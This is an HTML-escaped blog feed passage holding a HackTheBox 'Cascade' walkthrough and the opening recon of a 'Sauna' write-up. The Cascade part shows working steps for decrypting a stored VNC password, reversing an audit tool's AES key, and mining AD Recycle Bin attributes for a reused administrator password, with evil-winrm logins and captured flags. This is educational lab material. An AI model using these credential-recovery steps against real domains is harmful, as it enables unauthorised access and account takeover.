&lt;span class="code-line"&gt;[*] You are in the &amp;quot;framework&amp;quot; object&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;irb: warn: can&amp;#39;t alias jobs from irb_jobs.&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt; fixedkey = &amp;quot;\x17\x52\x6b\x06\x23\x4e\x58\x07&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;=&amp;gt; &amp;quot;\u0017Rk\u0006#NX\a&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt; require &amp;#39;rex/proto/rfb&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;=&amp;gt; true&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt; Rex::Proto::RFB::Cipher.decrypt [&amp;quot;6BCF2A4B6E5ACA0F&amp;quot;].pack(&amp;#39;H*&amp;#39;), fixedkey&lt;/span&gt;
&lt;span class="code-line"&gt;=&amp;gt; &amp;quot;sT333ve2&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;With this account we can connect to the box using
&lt;a href="https://github.com/Hackplayers/evil-winrm"&gt;evil-winrm&lt;/a&gt;. We quickly found the
user flag inside on our user Desktop.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/tools/github/evil-winrm$ ruby ./evil-winrm.rb -i 10.10.10.182 -u s.smith -p sT333ve2&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Evil-WinRM shell v1.8&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Info: Establishing connection to remote endpoint&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\s.smith\Documents&amp;gt; type &amp;quot;C:\Users\s.smith\Desktop\user.txt&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;6c624e1637cf604fec1cda8de1ad0779&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="getting-root"&gt;Getting root&lt;/h1&gt;
&lt;p&gt;We try to mount some other share with our &lt;code&gt;s.smith&lt;/code&gt; account. &lt;code&gt;Audit&lt;/code&gt; is interesting as
there is a executable binary &lt;code&gt;CascAudit.exe&lt;/code&gt;, a DLL &lt;code&gt;CascCrypto.dll&lt;/code&gt;, and a
SQLite Database &lt;code&gt;Audit.db&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ sudo mount //10.10.10.182/Audit$ /mnt/ -o username=s.smith&lt;/span&gt;
&lt;span class="code-line"&gt;Password for s.smith@//10.10.10.182/Audit$:  ********&lt;/span&gt;
&lt;span class="code-line"&gt;kali@kali:~$ tree /mnt/&lt;/span&gt;
&lt;span class="code-line"&gt;/mnt/&lt;/span&gt;
&lt;span class="code-line"&gt;├── CascAudit.exe&lt;/span&gt;
&lt;span class="code-line"&gt;├── CascCrypto.dll&lt;/span&gt;
&lt;span class="code-line"&gt;├── DB&lt;/span&gt;
&lt;span class="code-line"&gt;│   └── Audit.db&lt;/span&gt;
&lt;span class="code-line"&gt;├── RunAudit.bat&lt;/span&gt;
&lt;span class="code-line"&gt;├── System.Data.SQLite.dll&lt;/span&gt;
&lt;span class="code-line"&gt;├── System.Data.SQLite.EF6.dll&lt;/span&gt;
&lt;span class="code-line"&gt;├── x64&lt;/span&gt;
&lt;span class="code-line"&gt;│   └── SQLite.Interop.dll&lt;/span&gt;
&lt;span class="code-line"&gt;└── x86&lt;/span&gt;
&lt;span class="code-line"&gt;    └── SQLite.Interop.dll&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;3 directories, 8 files&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We load the executable in &lt;a href="https://github.com/0xd4d/dnSpy"&gt;DNSpy&lt;/a&gt; and look at
the code. We saw a function that use the Crypto DLL to decrypt a text providing
from the database using the key &lt;code&gt;c4scadek3y654321&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;using (SQLiteConnection sqliteConnection = new SQLiteConnection(&amp;quot;Data Source=&amp;quot; + MyProject.Application.CommandLineArgs[0] + &amp;quot;;Version=3;&amp;quot;))&lt;/span&gt;
&lt;span class="code-line"&gt;{&lt;/span&gt;
&lt;span class="code-line"&gt;  string str = string.Empty;&lt;/span&gt;
&lt;span class="code-line"&gt;  string password = string.Empty;&lt;/span&gt;
&lt;span class="code-line"&gt;  string str2 = string.Empty;&lt;/span&gt;
&lt;span class="code-line"&gt;  try&lt;/span&gt;
&lt;span class="code-line"&gt;  {&lt;/span&gt;
&lt;span class="code-line"&gt;    sqliteConnection.Open();&lt;/span&gt;
&lt;span class="code-line"&gt;    using (SQLiteCommand sqliteCommand = new SQLiteCommand(&amp;quot;SELECT * FROM LDAP&amp;quot;, sqliteConnection))&lt;/span&gt;
&lt;span class="code-line"&gt;    {&lt;/span&gt;
&lt;span class="code-line"&gt;      using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())&lt;/span&gt;
&lt;span class="code-line"&gt;      {&lt;/span&gt;
&lt;span class="code-line"&gt;        sqliteDataReader.Read();&lt;/span&gt;
&lt;span class="code-line"&gt;        str = Conversions.ToString(sqliteDataReader[&amp;quot;Uname&amp;quot;]);&lt;/span&gt;
&lt;span class="code-line"&gt;        str2 = Conversions.ToString(sqliteDataReader[&amp;quot;Domain&amp;quot;]);&lt;/span&gt;
&lt;span class="code-line"&gt;        string text = Conversions.ToString(sqliteDataReader[&amp;quot;Pwd&amp;quot;]);&lt;/span&gt;
&lt;span class="code-line"&gt;        try&lt;/span&gt;
&lt;span class="code-line"&gt;        {&lt;/span&gt;
&lt;span class="code-line"&gt;          password = Crypto.DecryptString(text, &amp;quot;c4scadek3y654321&amp;quot;);&lt;/span&gt;
&lt;span class="code-line"&gt;        }&lt;/span&gt;
&lt;span class="code-line"&gt;        catch (Exception ex)&lt;/span&gt;
&lt;span class="code-line"&gt;        {&lt;/span&gt;
&lt;span class="code-line"&gt;          Console.WriteLine(&amp;quot;Error decrypting password: &amp;quot; + ex.Message);&lt;/span&gt;
&lt;span class="code-line"&gt;          return;&lt;/span&gt;
&lt;span class="code-line"&gt;        }&lt;/span&gt;
&lt;span class="code-line"&gt;      }&lt;/span&gt;
&lt;span class="code-line"&gt;    }&lt;/span&gt;
&lt;span class="code-line"&gt;    sqliteConnection.Close();&lt;/span&gt;
&lt;span class="code-line"&gt;  }&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We repeat the SQL request using &lt;code&gt;sqlite3&lt;/code&gt; and got some base64 data for the
user &lt;code&gt;ArkSvc&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/pown/htb_cascade$ sqlite3 Audit.db&lt;/span&gt;
&lt;span class="code-line"&gt;SQLite version 3.31.0 2019-12-29 00:52:41&lt;/span&gt;
&lt;span class="code-line"&gt;Enter &amp;quot;.help&amp;quot; for usage hints.&lt;/span&gt;
&lt;span class="code-line"&gt;sqlite&amp;gt; SELECT * FROM LDAP;&lt;/span&gt;
&lt;span class="code-line"&gt;1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We look at the crypto code in the DLL (still using &lt;a href="https://github.com/0xd4d/dnSpy"&gt;DNSpy&lt;/a&gt;).
This is a simple AES using a fix IV and the key passed in parameter by the
executable binary.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;// Token: 0x06000013 RID: 19 RVA: 0x00002360 File Offset: 0x00000760&lt;/span&gt;
&lt;span class="code-line"&gt;public static string DecryptString(string EncryptedString, string Key)&lt;/span&gt;
&lt;span class="code-line"&gt;{&lt;/span&gt;
&lt;span class="code-line"&gt;  byte[] array = Convert.FromBase64String(EncryptedString);&lt;/span&gt;
&lt;span class="code-line"&gt;  Aes aes = Aes.Create();&lt;/span&gt;
&lt;span class="code-line"&gt;  aes.KeySize = 128;&lt;/span&gt;
&lt;span class="code-line"&gt;  aes.BlockSize = 128;&lt;/span&gt;
&lt;span class="code-line"&gt;  aes.IV = Encoding.UTF8.GetBytes(&amp;quot;1tdyjCbY1Ix49842&amp;quot;);&lt;/span&gt;
&lt;span class="code-line"&gt;  aes.Mode = CipherMode.CBC;&lt;/span&gt;
&lt;span class="code-line"&gt;  aes.Key = Encoding.UTF8.GetBytes(Key);&lt;/span&gt;
&lt;span class="code-line"&gt;  string @string;&lt;/span&gt;
&lt;span class="code-line"&gt;  using (MemoryStream memoryStream = new MemoryStream(array))&lt;/span&gt;
&lt;span class="code-line"&gt;  {&lt;/span&gt;
&lt;span class="code-line"&gt;    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Read))&lt;/span&gt;
&lt;span class="code-line"&gt;    {&lt;/span&gt;
&lt;span class="code-line"&gt;      byte[] array2 = new byte[checked(array.Length - 1 + 1)];&lt;/span&gt;
&lt;span class="code-line"&gt;      cryptoStream.Read(array2, 0, array2.Length);&lt;/span&gt;
&lt;span class="code-line"&gt;      @string = Encoding.UTF8.GetString(array2);&lt;/span&gt;
&lt;span class="code-line"&gt;    }&lt;/span&gt;
&lt;span class="code-line"&gt;  }&lt;/span&gt;
&lt;span class="code-line"&gt;  return @string;&lt;/span&gt;
&lt;span class="code-line"&gt;}&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Here is the &lt;a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)AES_Decrypt(%7B'option':'UTF8','string':'c4scadek3y654321'%7D,%7B'option':'UTF8','string':'1tdyjCbY1Ix49842'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D)&amp;input=QlFPNWw1S2o5TWRFclh4NlE2QUdPdz09"&gt;CyberChef recipe&lt;/a&gt; to decode the password: &lt;code&gt;w3lc0meFr31nd&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;From there we can can connect with the &lt;code&gt;ArkSvc&lt;/code&gt; account using
&lt;a href="https://github.com/Hackplayers/evil-winrm"&gt;evil-winrm&lt;/a&gt; and enumerate our
permissions.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/tools/github/evil-winrm$ ruby ./evil-winrm.rb -i 10.10.10.182 -u ArkSvc -p w3lc0meFr31nd&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Evil-WinRM shell v1.8&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Info: Establishing connection to remote endpoint&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\arksvc\Documents&amp;gt; whoami /all&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;USER INFORMATION&lt;/span&gt;
&lt;span class="code-line"&gt;----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;User Name      SID&lt;/span&gt;
&lt;span class="code-line"&gt;============== ==============================================&lt;/span&gt;
&lt;span class="code-line"&gt;cascade\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;GROUP INFORMATION&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Group Name&lt;/span&gt;
&lt;span class="code-line"&gt;===========================================&lt;/span&gt;
&lt;span class="code-line"&gt;Everyone&lt;/span&gt;
&lt;span class="code-line"&gt;BUILTIN\Users&lt;/span&gt;
&lt;span class="code-line"&gt;BUILTIN\Pre-Windows 2000 Compatible Access&lt;/span&gt;
&lt;span class="code-line"&gt;NT AUTHORITY\NETWORK&lt;/span&gt;
&lt;span class="code-line"&gt;NT AUTHORITY\Authenticated Users&lt;/span&gt;
&lt;span class="code-line"&gt;NT AUTHORITY\This Organization&lt;/span&gt;
&lt;span class="code-line"&gt;CASCADE\Data Share&lt;/span&gt;
&lt;span class="code-line"&gt;CASCADE\IT&lt;/span&gt;
&lt;span class="code-line"&gt;CASCADE\AD Recycle Bin&lt;/span&gt;
&lt;span class="code-line"&gt;CASCADE\Remote Management Users&lt;/span&gt;
&lt;span class="code-line"&gt;NT AUTHORITY\NTLM Authentication&lt;/span&gt;
&lt;span class="code-line"&gt;Mandatory Label\Medium Plus Mandatory Level&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;PRIVILEGES INFORMATION&lt;/span&gt;
&lt;span class="code-line"&gt;----------------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Privilege Name                Description                    State&lt;/span&gt;
&lt;span class="code-line"&gt;============================= ============================== =======&lt;/span&gt;
&lt;span class="code-line"&gt;SeMachineAccountPrivilege     Add workstations to domain     Enabled&lt;/span&gt;
&lt;span class="code-line"&gt;SeChangeNotifyPrivilege       Bypass traverse checking       Enabled&lt;/span&gt;
&lt;span class="code-line"&gt;SeIncreaseWorkingSetPrivilege Increase a process working set Enabled&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We are in the group &lt;code&gt;AD Recycle Bin&lt;/code&gt;. A few Google research lead us to
&lt;a href="https://docs.microsoft.com/en-us/archive/blogs/askds/the-ad-recycle-bin-understanding-implementing-best-practices-and-troubleshooting"&gt;a Microsoft article about AD recycle bin&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We execute the Powershell command to list the deleted objects and see some
&lt;code&gt;cascadeLegacyPwd&lt;/code&gt; filed for the user &lt;code&gt;TempAdmin&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\arksvc\Desktop&amp;gt;  Get-ADObject -filter &amp;#39;isdeleted -eq $true -and name -ne &amp;quot;Deleted Objects&amp;quot;&amp;#39; -includeDeletedObjects -property *&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;CanonicalName                   : cascade.local/Deleted Objects/User&lt;/span&gt;
&lt;span class="code-line"&gt;                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88&lt;/span&gt;
&lt;span class="code-line"&gt;CN                              : User&lt;/span&gt;
&lt;span class="code-line"&gt;                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88&lt;/span&gt;
&lt;span class="code-line"&gt;Created                         : 1/26/2020 2:34:31 AM&lt;/span&gt;
&lt;span class="code-line"&gt;createTimeStamp                 : 1/26/2020 2:34:31 AM&lt;/span&gt;
&lt;span class="code-line"&gt;Deleted                         : True&lt;/span&gt;
&lt;span class="code-line"&gt;Description                     :&lt;/span&gt;
&lt;span class="code-line"&gt;DisplayName                     :&lt;/span&gt;
&lt;span class="code-line"&gt;DistinguishedName               : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local&lt;/span&gt;
&lt;span class="code-line"&gt;dSCorePropagationData           : {1/1/1601 12:00:00 AM}&lt;/span&gt;
&lt;span class="code-line"&gt;instanceType                    : 4&lt;/span&gt;
&lt;span class="code-line"&gt;isDeleted                       : True&lt;/span&gt;
&lt;span class="code-line"&gt;LastKnownParent                 : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local&lt;/span&gt;
&lt;span class="code-line"&gt;Modified                        : 1/26/2020 2:40:52 AM&lt;/span&gt;
&lt;span class="code-line"&gt;modifyTimeStamp                 : 1/26/2020 2:40:52 AM&lt;/span&gt;
&lt;span class="code-line"&gt;msDS-LastKnownRDN               : User&lt;/span&gt;
&lt;span class="code-line"&gt;Name                            : User&lt;/span&gt;
&lt;span class="code-line"&gt;                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88&lt;/span&gt;
&lt;span class="code-line"&gt;nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity&lt;/span&gt;
&lt;span class="code-line"&gt;ObjectCategory                  :&lt;/span&gt;
&lt;span class="code-line"&gt;ObjectClass                     : container&lt;/span&gt;
&lt;span class="code-line"&gt;ObjectGUID                      : 746385f2-e3a0-4252-b83a-5a206da0ed88&lt;/span&gt;
&lt;span class="code-line"&gt;ProtectedFromAccidentalDeletion : False&lt;/span&gt;
&lt;span class="code-line"&gt;sDRightsEffective               : 0&lt;/span&gt;
&lt;span class="code-line"&gt;showInAdvancedViewOnly          : True&lt;/span&gt;
&lt;span class="code-line"&gt;uSNChanged                      : 196700&lt;/span&gt;
&lt;span class="code-line"&gt;uSNCreated                      : 196690&lt;/span&gt;
&lt;span class="code-line"&gt;whenChanged                     : 1/26/2020 2:40:52 AM&lt;/span&gt;
&lt;span class="code-line"&gt;whenCreated                     : 1/26/2020 2:34:31 AM&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;accountExpires                  : 9223372036854775807&lt;/span&gt;
&lt;span class="code-line"&gt;badPasswordTime                 : 0&lt;/span&gt;
&lt;span class="code-line"&gt;badPwdCount                     : 0&lt;/span&gt;
&lt;span class="code-line"&gt;CanonicalName                   : cascade.local/Deleted Objects/TempAdmin&lt;/span&gt;
&lt;span class="code-line"&gt;                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059&lt;/span&gt;
&lt;span class="code-line"&gt;cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz&lt;/span&gt;
&lt;span class="code-line"&gt;CN                              : TempAdmin&lt;/span&gt;
&lt;span class="code-line"&gt;                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059&lt;/span&gt;
&lt;span class="code-line"&gt;codePage                        : 0&lt;/span&gt;
&lt;span class="code-line"&gt;countryCode                     : 0&lt;/span&gt;
&lt;span class="code-line"&gt;Created                         : 1/27/2020 3:23:08 AM&lt;/span&gt;
&lt;span class="code-line"&gt;createTimeStamp                 : 1/27/2020 3:23:08 AM&lt;/span&gt;
&lt;span class="code-line"&gt;Deleted                         : True&lt;/span&gt;
&lt;span class="code-line"&gt;Description                     :&lt;/span&gt;
&lt;span class="code-line"&gt;DisplayName                     : TempAdmin&lt;/span&gt;
&lt;span class="code-line"&gt;DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local&lt;/span&gt;
&lt;span class="code-line"&gt;dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}&lt;/span&gt;
&lt;span class="code-line"&gt;givenName                       : TempAdmin&lt;/span&gt;
&lt;span class="code-line"&gt;instanceType                    : 4&lt;/span&gt;
&lt;span class="code-line"&gt;isDeleted                       : True&lt;/span&gt;
&lt;span class="code-line"&gt;LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local&lt;/span&gt;
&lt;span class="code-line"&gt;lastLogoff                      : 0&lt;/span&gt;
&lt;span class="code-line"&gt;lastLogon                       : 0&lt;/span&gt;
&lt;span class="code-line"&gt;logonCount                      : 0&lt;/span&gt;
&lt;span class="code-line"&gt;Modified                        : 1/27/2020 3:24:34 AM&lt;/span&gt;
&lt;span class="code-line"&gt;modifyTimeStamp                 : 1/27/2020 3:24:34 AM&lt;/span&gt;
&lt;span class="code-line"&gt;msDS-LastKnownRDN               : TempAdmin&lt;/span&gt;
&lt;span class="code-line"&gt;Name                            : TempAdmin&lt;/span&gt;
&lt;span class="code-line"&gt;                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059&lt;/span&gt;
&lt;span class="code-line"&gt;nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity&lt;/span&gt;
&lt;span class="code-line"&gt;ObjectCategory                  :&lt;/span&gt;
&lt;span class="code-line"&gt;ObjectClass                     : user&lt;/span&gt;
&lt;span class="code-line"&gt;ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059&lt;/span&gt;
&lt;span class="code-line"&gt;objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136&lt;/span&gt;
&lt;span class="code-line"&gt;primaryGroupID                  : 513&lt;/span&gt;
&lt;span class="code-line"&gt;ProtectedFromAccidentalDeletion : False&lt;/span&gt;
&lt;span class="code-line"&gt;pwdLastSet                      : 132245689883479503&lt;/span&gt;
&lt;span class="code-line"&gt;sAMAccountName                  : TempAdmin&lt;/span&gt;
&lt;span class="code-line"&gt;sDRightsEffective               : 0&lt;/span&gt;
&lt;span class="code-line"&gt;userAccountControl              : 66048&lt;/span&gt;
&lt;span class="code-line"&gt;userPrincipalName               : TempAdmin@cascade.local&lt;/span&gt;
&lt;span class="code-line"&gt;uSNChanged                      : 237705&lt;/span&gt;
&lt;span class="code-line"&gt;uSNCreated                      : 237695&lt;/span&gt;
&lt;span class="code-line"&gt;whenChanged                     : 1/27/2020 3:24:34 AM&lt;/span&gt;
&lt;span class="code-line"&gt;whenCreated                     : 1/27/2020 3:23:08 AM&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We decode the base64 filed and found some password.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ echo -ne &amp;#39;YmFDVDNyMWFOMDBkbGVz&amp;#39; | base64 -d&lt;/span&gt;
&lt;span class="code-line"&gt;baCT3r1aN00dles&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;My first idea was to restore the object but it seems that this is not possible.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\arksvc\Documents&amp;gt;  Get-ADObject -Filter &amp;#39;samaccountname -eq &amp;quot;TempAdmin&amp;quot;&amp;#39; -IncludeDeletedObjects | Restore-ADObject&lt;/span&gt;
&lt;span class="code-line"&gt;Insufficient access rights to perform the operation&lt;/span&gt;
&lt;span class="code-line"&gt;At line:1 char:81&lt;/span&gt;
&lt;span class="code-line"&gt;+ ... ccountname -eq &amp;quot;TempAdmin&amp;quot;&amp;#39; -IncludeDeletedObjects | Restore-ADObject&lt;/span&gt;
&lt;span class="code-line"&gt;+                                                          ~~~~~~~~~~~~~~~~&lt;/span&gt;
&lt;span class="code-line"&gt;    + CategoryInfo          : InvalidOperation: (CN=TempAdmin\0A...ascade,DC=local:ADObject) [Restore-ADObject], ADException&lt;/span&gt;
&lt;span class="code-line"&gt;    + FullyQualifiedErrorId : 0,Microsoft.ActiveDirectory.Management.Commands.RestoreADObject&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Therefore I just tried to connect as &lt;code&gt;administrator&lt;/code&gt; hoping for password reuse,
it worked and I was able to get the root flag..&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/tools/github/evil-winrm$ ruby ./evil-winrm.rb -i 10.10.10.182 -u administrator -pbaCT3r1aN00dles&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Evil-WinRM shell v1.8&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Info: Establishing connection to remote endpoint&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; type ../Desktop/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;86e93219a4f189663d558122a087a4c3&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="wrapping-up"&gt;Wrapping up&lt;/h2&gt;
&lt;p&gt;This box was fun as there was a lot of different stuff and everything went
smoothly. The only painful part is the dig into the &lt;code&gt;ldapsearch&lt;/code&gt; results as the
file is quit long (6 363 lines).&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="Windows"></category><category term="LDAP"></category><category term="VNC"></category><category term="AD Recycle bin"></category></entry><entry><title>HTB: Sauna</title><link href="https://maggick.fr/2020/07/htb-sauna.html" rel="alternate"></link><published>2020-07-22T09:35:00+02:00</published><updated>2020-07-22T09:35:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-07-22:/2020/07/htb-sauna.html</id><summary type="html">&lt;p&gt;&lt;img alt="Sauna card" class="align-left" src="/media/2020.07/sauna_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/229"&gt;Sauna&lt;/a&gt; published on
February the 15th 2020 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/94858"&gt;egotisticalSW&lt;/a&gt;
This box is classified as an easy machine. This box has a lot of similarities
with &lt;a href="https://maggick.fr/2020/03/htb-forest.html"&gt;forest&lt;/a&gt;: The user part require some smart enumeration. The
second user also require to enumerate the box and the root part is a "simple"
exploitation of the second user's privileges.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.07/sauna_card.png" alt="Sauna card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/229"&gt;Sauna&lt;/a&gt; published on
February the 15th 2020 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/94858"&gt;egotisticalSW&lt;/a&gt;
This box is classified as an easy machine. This box has a lot of similarities
with &lt;a href="https://maggick.fr/2020/03/htb-forest.html"&gt;forest&lt;/a&gt;: The user part require some smart enumeration. The
second user also require to enumerate the box and the root part is a "simple"
exploitation of the second user's privileges.&lt;/p&gt;


&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;We start with an nmap scan. As always with the Windows boxes, a lot of services
are exposed by the box.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Mon Feb 17 08:29:26 2020 as: nmap -p- -sS -oN nmap_ss 10.10.10.175&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.175&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.27s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65515 filtered ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT      STATE SERVICE&lt;/span&gt;
&lt;span class="code-line"&gt;53/tcp    open  domain&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp    open  http&lt;/span&gt;
&lt;span class="code-line"&gt;88/tcp    open  kerberos-sec&lt;/span&gt;
&lt;span class="code-line"&gt;135/tcp   open  msrpc&lt;/span&gt;
&lt;span class="code-line"&gt;139/tcp   open  netbios-ssn&lt;/span&gt;
&lt;span class="code-line"&gt;389/tcp   open  ldap&lt;/span&gt;
&lt;span class="code-line"&gt;445/tcp   open  microsoft-ds&lt;/span&gt;
&lt;span class="code-line"&gt;464/tcp   open  kpasswd5&lt;/span&gt;
&lt;span class="code-line"&gt;593/tcp   open  http-rpc-epmap&lt;/span&gt;
&lt;span class="code-line"&gt;636/tcp   open  ldapssl&lt;/span&gt;
&lt;span class="code-line"&gt;3268/tcp  open  globalcatLDAP&lt;/span&gt;
&lt;span class="code-line"&gt;3269/tcp  open  globalcatLDAPssl&lt;/span&gt;
&lt;span class="code-line"&gt;5985/tcp  open  wsman&lt;/span&gt;
